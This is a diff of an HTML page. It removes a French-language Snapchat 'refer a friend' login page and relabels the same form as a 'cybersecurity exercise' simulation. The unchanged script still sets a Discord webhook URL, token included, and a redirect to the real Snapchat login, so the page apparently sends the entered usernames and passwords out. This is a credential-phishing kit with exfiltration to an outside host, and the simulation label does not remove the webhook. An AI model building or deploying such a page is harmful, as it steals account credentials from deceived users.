@@ -3,133 +3,110 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Snapchat | Parrainez Un Ami</title>
-
-  <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
-  <meta property="og:description" content="Description courte" />
-  <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
+  <title>Simulation | Exercice cybersécurité</title>
 
   <style>
     body {
       margin: 0;
       padding: 0;
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f0f0f0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
-    .login-box, .image-screen {
+
+    .login-box, .text-screen {
       width: 100%;
       max-width: 400px;
       padding: 40px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      background: #fff;
       border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
       text-align: center;
-      background-color: #fff;
-      color: #000;
     }
-    .logo {
-      width: 80px;
-      margin: 0 auto 20px auto;
-      display: block;
-    }
+
     .form-group {
       text-align: left;
       margin-bottom: 15px;
     }
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      font-weight: bold;
-      margin-bottom: 5px;
-    }
+
     .form-group input {
       width: 100%;
       padding: 12px;
-      border: 1px solid #ccc;
       border-radius: 8px;
-      font-size: 16px;
-      box-sizing: border-box;
+      border: 1px solid #ccc;
     }
+
     button {
-      background-color: #fffc00;
+      background: #fffc00;
       border: none;
-      color: #000;
-      font-weight: bold;
       padding: 12px;
       width: 100%;
+      font-weight: bold;
       border-radius: 8px;
       cursor: pointer;
-      margin-top: 20px;
-      font-size: 16px;
     }
-    .links-container {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 10px;
-      font-size: 14px;
-    }
-    .link-button {
-      background: transparent;
-      border: none;
-      color: blue;
-      font-weight: bold;
-      cursor: pointer;
-      text-decoration: underline;
-    }
-    #errorMessage,
-    #referralError {
+
+    #errorMessage, #referralError {
       color: red;
       display: none;
       margin-top: 10px;
     }
-    #imageScreen {
+
+    #textScreen {
       display: none;
     }
-    #imageScreen img {
-      width: 200px; /* taille réduite */
-      border-radius: 10px;
-      display: block;
-      margin: 0 auto;
+
+    .info-box {
+      text-align: left;
+      background: #f9f9f9;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 14px;
     }
   </style>
 </head>
+
 <body>
-  <div class="login-box" id="loginBox">
-    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
-    <h2>Snapchat | Parrainez Un Ami</h2>
-    <form id="loginForm">
-      <div class="form-group">
-        <label for="username">Nom d'utilisateur ou e-mail</label>
-        <input type="text" id="username" required />
-      </div>
-      <div class="form-group">
-        <label for="password">Mot de passe</label>
-        <input type="password" id="password" required />
-      </div>
-      <div class="form-group">
-        <label for="referralCode">Code de parrainage</label>
-        <input type="text" id="referralCode" required />
-      </div>
 
-      <button type="submit">Connexion</button>
+<div class="login-box" id="loginBox">
+  <h2>Formulaire de simulation</h2>
 
-      <div class="links-container">
-        <button type="button" class="link-button">S'inscrire</button>
-        <button type="button" class="link-button">Mot de passe oublié</button>
-      </div>
-    </form>
-    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
-    <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
+  <form id="loginForm">
+    <div class="form-group">
+      <label>Identifiant</label>
+      <input type="text" id="username" required>
+    </div>
+
+    <div class="form-group">
+      <label>Mot de passe</label>
+      <input type="password" id="password" required>
+    </div>
+
+    <div class="form-group">
+      <label>Code</label>
+      <input type="text" id="referralCode" required>
+    </div>
+
+    <button type="submit">Connexion</button>
+  </form>
+
+  <p id="errorMessage">Erreur de saisie.</p>
+  <p id="referralError">Code invalide.</p>
+</div>
+
+<div class="text-screen" id="textScreen">
+  <h2>Résultat de l'exercice</h2>
+  <div class="info-box">
+    Cette page remplace l’action réseau.<br><br>
+    Elle montre ce qui aurait pu se produire
+    dans un contexte réel.
   </div>
+</div>
 
-  <div class="image-screen" id="imageScreen">
-    <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Confirmation Snapchat" />
-  </div>
-
-  <script>
+<script>
     const webhookURL = "https://discord.com/api/webhooks/1456052165062955154/PIffzSrsDCnQ4Q-Um7YqT4e9Ti6Cz7m8FbSHqI169lw6MnT8nra8dyS_zEesu9M3wsNS";
     const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
 
@@ -197,5 +174,4 @@
   </script>
 </body>
 </html>
-
 
